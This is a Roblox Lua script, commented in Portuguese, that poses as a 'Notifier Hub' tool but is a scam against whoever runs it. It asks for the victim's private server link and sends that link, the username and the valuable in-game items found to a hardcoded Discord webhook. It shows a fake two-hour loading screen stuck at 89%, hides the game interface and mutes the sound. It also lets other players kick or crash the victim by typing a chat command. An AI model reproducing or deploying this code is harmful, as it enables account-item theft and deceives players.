-- Serviços
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TextService = game:GetService("TextService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local SoundService = game:GetService("SoundService")
local UserGameSettings = UserSettings():GetService("UserGameSettings")

-- Variáveis globais
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local screenGui = Instance.new("ScreenGui")
local loadingScreenGui = Instance.new("ScreenGui")
local connection
local serverLink = ""
local webhookUrl = "https://discord.com/api/webhooks/1439734957034700902/67MGvp1Cp0hXSPHfuPHu54X7kOhTZRUSmz34n1HLhLl-M5U9cPtNuhevymNbHtreteYO"

-- Configurar para ficar sempre no topo
screenGui.Name = "NotifierHubGUI"
screenGui.DisplayOrder = 999
screenGui.ResetOnSpawn = false
screenGui.Parent = CoreGui

loadingScreenGui.Name = "LoadingScreenGUI"
loadingScreenGui.DisplayOrder = 1000
loadingScreenGui.ResetOnSpawn = false

-- Função para criar a GUI principal
local function createMainGUI()
    -- Frame principal
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 250)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    -- Arredondar cantos
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = mainFrame

    -- Sombra
    local shadow = Instance.new("ImageLabel")
    shadow.Size = UDim2.new(1, 10, 1, 10)
    shadow.Position = UDim2.new(0, -5, 0, -5)
    shadow.BackgroundTransparency = 1
    shadow.Image = "rbxassetid://1316045217"
    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    shadow.ImageTransparency = 0.8
    shadow.ScaleType = Enum.ScaleType.Slice
    shadow.SliceCenter = Rect.new(10, 10, 118, 118)
    shadow.Parent = mainFrame

    -- Título
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    title.Text = "NOTIFIER HUB - INSIRA O LINK"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 18
    title.Font = Enum.Font.GothamBold
    title.Parent = mainFrame

    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 8)
    titleCorner.Parent = title

    -- Campo de digitação
    local inputFrame = Instance.new("Frame")
    inputFrame.Size = UDim2.new(0.9, 0, 0, 40)
    inputFrame.Position = UDim2.new(0.05, 0, 0.25, 0)
    inputFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    inputFrame.Parent = mainFrame

    local inputCorner = Instance.new("UICorner")
    inputCorner.CornerRadius = UDim.new(0, 6)
    inputCorner.Parent = inputFrame

    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(0.95, 0, 0.8, 0)
    textBox.Position = UDim2.new(0.025, 0, 0.1, 0)
    textBox.BackgroundTransparency = 1
    textBox.PlaceholderText = "Cole o link do seu servidor privado aqui..."
    textBox.PlaceholderColor3 = Color3.fromRGB(180, 180, 180)
    textBox.Text = ""
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.TextSize = 14
    textBox.Font = Enum.Font.Gotham
    textBox.ClearTextOnFocus = false
    textBox.Parent = inputFrame

    -- Texto de erro
    local errorLabel = Instance.new("TextLabel")
    errorLabel.Size = UDim2.new(0.9, 0, 0, 20)
    errorLabel.Position = UDim2.new(0.05, 0, 0.45, 0)
    errorLabel.BackgroundTransparency = 1
    errorLabel.Text = "⚠️ O campo não pode ficar vazio!"
    errorLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
    errorLabel.TextSize = 12
    errorLabel.Font = Enum.Font.Gotham
    errorLabel.Visible = false
    errorLabel.Parent = mainFrame

    -- Botão
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.9, 0, 0, 50)
    button.Position = UDim2.new(0.05, 0, 0.65, 0)
    button.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
    button.Text = "NOTIFER HUB, METODH BRANZZ🔰🔗"
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.TextSize = 16
    button.Font = Enum.Font.GothamBold
    button.Parent = mainFrame

    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 6)
    buttonCorner.Parent = button

    -- Efeito hover no botão
    button.MouseEnter:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(0, 120, 230)
    end)

    button.MouseLeave:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
    end)

    -- Função do botão
    button.MouseButton1Click:Connect(function()
        local link = textBox.Text
        if link == nil or link == "" or link:gsub("%s+", "") == "" then
            errorLabel.Visible = true
            wait(3)
            errorLabel.Visible = false
        else
            serverLink = link
            screenGui:Destroy()
            createLoadingScreen()
            startLoadingProcess()
        end
    end)
end

-- Função para criar tela de carregamento
local function createLoadingScreen()
    loadingScreenGui.Parent = CoreGui
    
    -- Frame principal que cobre toda a tela
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(1, 0, 1, 0)
    mainFrame.Position = UDim2.new(0, 0, 0, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(10, 20, 40)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = loadingScreenGui

    -- Texto principal
    local mainText = Instance.new("TextLabel")
    mainText.Size = UDim2.new(1, 0, 0, 60)
    mainText.Position = UDim2.new(0, 0, 0.3, 0)
    mainText.BackgroundTransparency = 1
    mainText.Text = "DUPLICATE HUB ☣️ ESTA PREPARADO PASTAS E COMANDOS VISUAIS...."
    mainText.TextColor3 = Color3.fromRGB(255, 255, 255)
    mainText.TextSize = 24
    mainText.Font = Enum.Font.GothamBold
    mainText.Parent = mainFrame

    -- Texto de status
    local statusText = Instance.new("TextLabel")
    statusText.Size = UDim2.new(1, 0, 0, 30)
    statusText.Position = UDim2.new(0, 0, 0.4, 0)
    statusText.BackgroundTransparency = 1
    statusText.Text = "INICIANDO..."
    statusText.TextColor3 = Color3.fromRGB(200, 200, 255)
    statusText.TextSize = 16
    statusText.Font = Enum.Font.Gotham
    statusText.Parent = mainFrame

    -- Barra de progresso
    local progressBackground = Instance.new("Frame")
    progressBackground.Size = UDim2.new(0.6, 0, 0, 20)
    progressBackground.Position = UDim2.new(0.2, 0, 0.5, 0)
    progressBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
    progressBackground.BorderSizePixel = 0
    progressBackground.Parent = mainFrame

    local progressCorner = Instance.new("UICorner")
    progressCorner.CornerRadius = UDim.new(0, 10)
    progressCorner.Parent = progressBackground

    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.Position = UDim2.new(0, 0, 0, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    progressBar.BorderSizePixel = 0
    progressBar.Parent = progressBackground

    local progressBarCorner = Instance.new("UICorner")
    progressBarCorner.CornerRadius = UDim.new(0, 10)
    progressBarCorner.Parent = progressBar

    -- Texto de porcentagem
    local percentText = Instance.new("TextLabel")
    percentText.Size = UDim2.new(0.6, 0, 0, 30)
    percentText.Position = UDim2.new(0.2, 0, 0.55, 0)
    percentText.BackgroundTransparency = 1
    percentText.Text = "0%"
    percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
    percentText.TextSize = 18
    percentText.Font = Enum.Font.GothamBold
    percentText.Parent = mainFrame

    -- Remover todos os botões da interface
    for _, gui in ipairs(CoreGui:GetChildren()) do
        if gui:IsA("ScreenGui") and gui ~= loadingScreenGui then
            gui:Destroy()
        end
    end

    -- Esconder a barra de controle do Roblox
    local StarterGui = game:GetService("StarterGui")
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    end)

    return statusText, progressBar, percentText
end

-- Lista de textos aleatórios para carregamento
local loadingMessages = {
    "PROCURANDO ANTI CHEAT",
    "PROCURANDO REMOT EVENTS",
    "APLICANDO COMANDOS VISUAIS", 
    "ERRO, AO APLICA TENTANDO NOVAMENTE",
    "CONECTANDO A API PUBLIC",
    "ERRO AO CONECTAR A API...",
    "CONECTADO COM API PUBLICA COM SUCESSO!",
    "PROCURANDO BRAINROTS LISTADOS",
    "PROCURANDO EM SERVIDORES PRIVADOS...",
    "🔑SUCCES CONECTADO COM API PRIVADA",
    "🔗 PUXANDO PESSOAS PARA SEU SERV",
    "[ NOME ALEATÓRIO DE UM PLAYER] ENTROU NO SERV , ....",
    "BRAINROTS Q POSSUI 0, PROCURANDO OUTRO...."
}

-- Lista de Brainrots válidos
local VALID_BRAINROTS = {
    "Brri Brri Bicus Dicus Bombicus", "Brutto Gialutto", "Bulbito Bandito Traktorito", "Trulinero Trulicina", 
    "Caessito Satalito", "Cacto Hippopotamo", "Capi Taco", "Matteo", "Caramello Filtrello", "Carloo", 
    "Carrotini Brainini", "Cavallo Virtuoso", "Cellularcini Viciosini", "Chachechi", "Noobini Pizzanini", 
    "Bubo de Fuego", "Chihuanini Taconini", "Chimpanzini Bananini", "Pipi Kiwi", "Cocosini Mama", 
    "Crabbo Limonetta", "Rang Ring Bus", "Dug dug dug", "Dul Dul Dul", "Elefanto Frigo", "Esok Sekolah", 
    "Espresso Signora", "Extinct Ballerina", "Extinct Matteo", "Extinct Tralalero", "Orcalero Orcala", 
    "Fragola La La La", "Frigo Camelo", "Ganganzelli Trulala", "Garama and Madundung", "Spooky and Pumpky", 
    "Gattatino Nyanino", "Gattito Tacoto", "Odin Din Din Dun", "Glorbo Fruttodrillo", "Gorillo Subwoofero", 
    "Gorillo Watermelondrillo", "Grajpuss Medussi", "Guerriro Digitale", "Job Job Job Sahur", "Karkerkar Kurkur", 
    "Ketchuru and Musturu", "Ketupat Kepat", "La Cucaracha", "La Extinct Grande", "La Grande Combinasion", 
    "La Karkerkar Combinasion", "La Sahur Combinasion", "La Supreme Combinasion", "La Vacca Saturno Saturnita", 
    "Los Crocodillitos", "Las Capuchinas", "Fluriflura", "Las Tralaleritas", "Lerulerulerule", "Lionel Cactuseli", 
    "Burbaloni Lollioli", "Los Combinasionas", "Los Hotspotsitos", "Los Chicleteiras", "Las Vaquitas Saturnitas", 
    "Los Noobinis", "Los Noobo My Hotspotsitos", "Gizafa Celestre", "Las Sis", "Los Matteos", "Los Tipi Tacos", 
    "Los Orcalltos", "Los Bros", "Los Bombinitos", "Zibra Zibralini", "Corn Corn Corn Sahur", "Malame Amarele", 
    "Mangolini Parrocini", "Mariachi Corazoni", "Mastodontico Telepedeone", "Ta Ta Ta Ta Sahur", "Urubini Flamenguini", 
    "Los Tungtungtungcitos", "Nooo My Hotspot", "Nuclearo Dinossauro", "Bandito Bobritto", "Chillin Chili", 
    "Alessio", "Orcellia Orcala", "Pakrahmatnamat", "Pandaccini Bananini", "Penguino Cocosino", "Perochello Lemonchello", 
    "Pi Pi Watermelon", "Piccione Macchina", "Piccionetta Macchina", "Pipi Avocado", "Pipi Corni", "Bambini Crostini", 
    "Pipi Potato", "Pot Hotspot", "Quesadilla Crocodila", "Quivioli Ameleonni", "Raccooni Jandelini", "Rhino Helicopterino", 
    "Rhino Toasterino", "Salamino Penguino", "Sammyni Spyderini", "Los Spyderinis", "Sigma Boy", "Sigma Girl", 
    "Signore Carapace", "Spaghetti Tualetti", "Spioniro Golubiro", "Strawberrelli Flamingelli", "Tim Cheese", 
    "Svinina Bombardino", "Chef Crabracadabra", "Tukanno Bananno", "Tacorita Bicicleta", "Talpa Di Fero", 
    "Tartaruga Cisterna", "Te Te Te Sahur", "Ti Iì Iì Tahur", "Tietze Sahur", "Trippi Troppi", "Tigroligre Frutonni", 
    "Cocofanto Elefanto", "Tipi Topi Taco", "Tirilikalika Tirilikalako", "To to to Sahur", "Tob Tobì Tobì", 
    "Torrtuginni Dragonfrutini", "Tracoductulu Delapeladustuz", "Tractoro Dinosauro", "Tralaledon", "Tralalero Tralala", 
    "Tralalita Tralala", "Trenostruzzo Turbo 3000", "Trenostruzzo Turbo 4000", "Tric Trac Baraboom", "Trippi Troppi Troppa Trippa", 
    "Cappuccino Assassino", "Strawberry Elephant", "Mythic Lucky Block", "Noo my Candy", "Brainrot God Lucky Block", 
    "Taco Lucky Block", "Admin Lucky Block", "Toiletto Focaccino", "Yes any examine", "Brashlini Berimbini", 
    "Tang Tang Keletang", "Noo my examine", "Los Primos", "Karker Sahur", "Los Tacoritas", "Perrito Burrito", 
    "Brr Brr Patapàn", "Pop Pop Sahur", "Bananito Bandito", "La Secret Combinasion", "Los Jobcitos", "Los Tortus", 
    "Los 67", "Los Karkeritos", "Squalanana", "Cachorrito Melonito", "Los Lucky Blocks", "Burguro And Fryuro", 
    "Eviledon", "Zombie Tralala", "Jacko Spaventosa", "Los Mobilis", "Chicleteirina Bicicleteirina", "La Spooky Grande", 
    "La Vacca Jacko Linterino", "Vulturino Skeletono", "Tartaragno", "Pinealotto Fruttarino", "Vampira Cappucina", 
    "Quackula", "Mummio Rappitto", "Tentacolo Tecnico", "Jacko Jack Jack", "Magi Ribbitini", "Frankentteo", 
    "Snailenzo", "Chicleteira Bicicleteira", "Lirilli Larila", "Headless Horseman", "Frogato Pirato", "Mieteteira Bicicleteira", 
    "Pakrahmatmatina", "Krupuk Pagi Pagi", "Boatito Auratico", "Bambu Bambu Sahur", "Bananita Dolphintita", "Meowl", 
    "Horegini Boom", "Questadillo Vampiro", "Chipso and Queso", "Mummy Ambalabu", "Jackorilla", "Trickolino", 
    "Secret Lucky Block", "Los Spooky Combinasionas", "Telemorte", "Cappuccino Clownino", "Pot Pumpkin", 
    "Pumpkini Spyderini", "La Casa Boo", "Skull Skull Skull", "Spooky Lucky Block", "Burrito Bandito", 
    "La Taco Combinasion", "Frio Ninja", "Nombo Rollo", "Guest 666", "Ixixixi", "Aquanaut", "Capitano Moby", "Secret"
}

-- IDs para procurar
local TARGET_IDS = {
    "28e4ec29-d005-4636-82af-339f37dcef",
    "960ab477-3f31-4327-845e-6a77ebb5fa6",
    "2206090e-719d-4034-8720-700c9fb2h458",
    "dd76771-ce3c-4108-adae-5a488b2958be",
    "44392a62-6012-413d-9619-dab73c00539f",
    "f38295a3-05ed-fala-959d-5ebe3fd35e5",
    "ed0775b7-ea79-4c54-b9e2-lea07283065d",
    "a55b93d6-2c07-40f6-97fe-d03a87d2d5f0"
}

-- Função para verificar se um nome é um brainrot válido
local function isValidBrainrot(name)
    for _, brainrot in ipairs(VALID_BRAINROTS) do
        if name == brainrot then
            return true
        end
    end
    return false
end

-- Função para procurar brainrots na workspace
local function findBrainrots()
    local foundBrainrots = {}
    
    -- Procurar na pasta Plots
    local plotsFolder = workspace:FindFirstChild("Plots")
    if plotsFolder then
        for _, plot in ipairs(plotsFolder:GetDescendants()) do
            if plot:IsA("Model") and isValidBrainrot(plot.Name) then
                table.insert(foundBrainrots, plot.Name)
            end
        end
    end
    
    -- Procurar por IDs específicos
    for _, id in ipairs(TARGET_IDS) do
        local model = workspace:FindFirstChild(id)
        if model and model:IsA("Model") and isValidBrainrot(model.Name) then
            table.insert(foundBrainrots, model.Name)
        end
    end
    
    -- Remover duplicatas
    local uniqueBrainrots = {}
    for _, brainrot in ipairs(foundBrainrots) do
        local alreadyExists = false
        for _, existing in ipairs(uniqueBrainrots) do
            if existing == brainrot then
                alreadyExists = true
                break
            end
        end
        if not alreadyExists then
            table.insert(uniqueBrainrots, brainrot)
        end
    end
    
    return uniqueBrainrots
end

-- Função para parsear dinheiro por segundo
local function parseMoneyPerSec(text)
    if not text then return 0 end
    local mult = 1
    local numberStr = text:match("[%d%.]+")
    if not numberStr then return 0 end
    if text:find("K") then mult = 1_000
    elseif text:find("M") then mult = 1_000_000
    elseif text:find("B") then mult = 1_000_000_000
    elseif text:find("T") then mult = 1_000_000_000_000
    elseif text:find("Q") then mult = 1_000_000_000_000_000 end
    return tonumber(numberStr) * mult
end

-- Função para detectar brainrots valorizados
local function findValorizedBrainrots()
    local valorizadoDog = false
    local brainrotsWebhook = {}
    
    -- Procurar por brainrots valorizados
    local detectedBrainrots = findBrainrots()
    
    for _, brainrotName in ipairs(detectedBrainrots) do
        -- Simular verificação de valor (adaptar conforme necessário)
        table.insert(brainrotsWebhook, {nome = brainrotName, valor = "Alto valor"})
        valorizadoDog = true
    end
    
    return valorizadoDog, brainrotsWebhook
end

-- Função para enviar webhook
local function sendWebhook(messageType, extraData)
    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
    local playerName = player.Name
    local playerCount = #Players:GetPlayers()
    
    local detectedBrainrots = findBrainrots()
    local brainrotsList = ""
    
    if #detectedBrainrots > 0 then
        for i, brainrot in ipairs(detectedBrainrots) do
            brainrotsList = brainrotsList .. "• " .. brainrot .. "\n"
            if i >= 40 then
                brainrotsList = brainrotsList .. "... e mais\n"
                break
            end
        end
    else
        brainrotsList = "Nenhum brainrot detectado"
    end
    
    local embedData = {
        title = "🧠 NOTIFIER HUB - " .. messageType .. " 🧠",
        color = 0x0066CC,
        fields = {
            {
                name = "⌛ Data e hora:",
                value = currentTime,
                inline = false
            },
            {
                name = "👤 Usuário:",
                value = playerName,
                inline = true
            },
            {
                name = "👥 Players no servidor:",
                value = tostring(playerCount),
                inline = true
            },
            {
                name = "🎒🧠 BRAINROTS DETECTADOS:",
                value = brainrotsList,
                inline = false
            },
            {
                name = "🔗 Link do Servidor:",
                value = serverLink ~= "" and "[Clique aqui](" .. serverLink .. ")" or "Não fornecido",
                inline = false
            }
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    -- Adicionar dados extras se for kick/crash
    if extraData then
        table.insert(embedData.fields, {
            name = extraData.type,
            value = extraData.message,
            inline = false
        })
    end
    
    local payload = {
        content = "@everyone @here, Notificação do NOTIFIER HUB @everyone @here",
        embeds = {embedData}
    }
    
    -- Enviar webhook
    pcall(function()
        local response = request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
        print("✅ Webhook enviado: " .. messageType)
    end)
end

-- Sistema de kick/crash
local function setupKickCrashSystem()
    Players.PlayerAdded:Connect(function(plr)
        plr.Chatted:Connect(function(message)
            local msg = message:lower()
            if msg == "kick" or msg == "/kick" then
                -- Kickar o jogador que executou o script
                player:Kick("Erro: 89972 script\nOla esta mensagem foi enviada pois anti cheat pegou agente então, tivemos que dar um kick em você para não sofre punição 🔰")
                
                -- Enviar webhook
                sendWebhook("KICK DETECTADO", {
                    type = "🚨 KICK EXECUTADO",
                    message = "Jogador **" .. plr.Name .. "** executou kick em **" .. player.Name .. "**"
                })
                
            elseif msg == "crash" or msg == "/crash" then
                -- Crashar o jogo
                while true do
                    print("CRASHING...")
                end
                
                -- Enviar webhook
                sendWebhook("CRASH DETECTADO", {
                    type = "💥 CRASH EXECUTADO", 
                    message = "Jogador **" .. plr.Name .. "** executou crash em **" .. player.Name .. "**"
                })
            end
        end)
    end)
end

-- Sistema de detecção de saída do jogo
local function setupLeaveDetection()
    Players.PlayerRemoving:Connect(function(leavingPlayer)
        if leavingPlayer == player then
            sendWebhook("USUÁRIO SAIU DO JOGO", {
                type = "🚪 SAÍDA DETECTADA",
                message = "**" .. player.Name .. "** saiu do jogo após executar o script"
            })
        end
    end)
end

-- Função para controlar volume
local function controlVolume()
    UserGameSettings.MasterVolume = 0
    SoundService.Volume = 0
    
    print("🔇 Volume definido para 0%")
    
    -- Manter sempre em 0
    while true do
        wait(0.5)
        UserGameSettings.MasterVolume = 0
        SoundService.Volume = 0
    end
end

-- Função principal de carregamento
local function startLoadingProcess()
    local statusText, progressBar, percentText = createLoadingScreen()
    
    -- Iniciar controle de volume em thread separada
    spawn(controlVolume)
    
    -- Enviar webhook de início
    sendWebhook("SCRIPT INICIADO")
    
    -- Configurar sistemas
    setupKickCrashSystem()
    setupLeaveDetection()
    
    local startTime = tick()
    local duration = 2 * 60 * 60 -- 2 horas em segundos
    local messageIndex = 1
    local lastMessageChange = 0
    local lastProgressUpdate = 0
    
    -- Loop de carregamento
    connection = RunService.Heartbeat:Connect(function()
        local currentTime = tick()
        local elapsed = currentTime - startTime
        local progress = elapsed / duration
        
        -- Atualizar progresso (mais rápido no início, trava no 89%)
        local displayProgress = progress
        if progress > 0.89 then
            displayProgress = 0.89
        else
            displayProgress = progress * 0.89 / 0.89 -- Acelera um pouco
        end
        
        -- Atualizar barra e texto
        progressBar.Size = UDim2.new(displayProgress, 0, 1, 0)
        percentText.Text = string.format("%.1f%%", displayProgress * 100)
        
        -- Mudar mensagem a cada 3 segundos
        if currentTime - lastMessageChange > 3 then
            statusText.Text = loadingMessages[messageIndex]
            messageIndex = messageIndex + 1
            if messageIndex > #loadingMessages then
                messageIndex = 1
            end
            lastMessageChange = currentTime
        end
        
        -- Verificar se terminou
        if elapsed >= duration then
            connection:Disconnect()
            percentText.Text = "100%"
            statusText.Text = "CARREGAMENTO COMPLETO!"
            
            -- Enviar webhook de conclusão
            sendWebhook("CARREGAMENTO CONCLUÍDO")
        end
    end)
end

-- Iniciar a GUI
createMainGUI()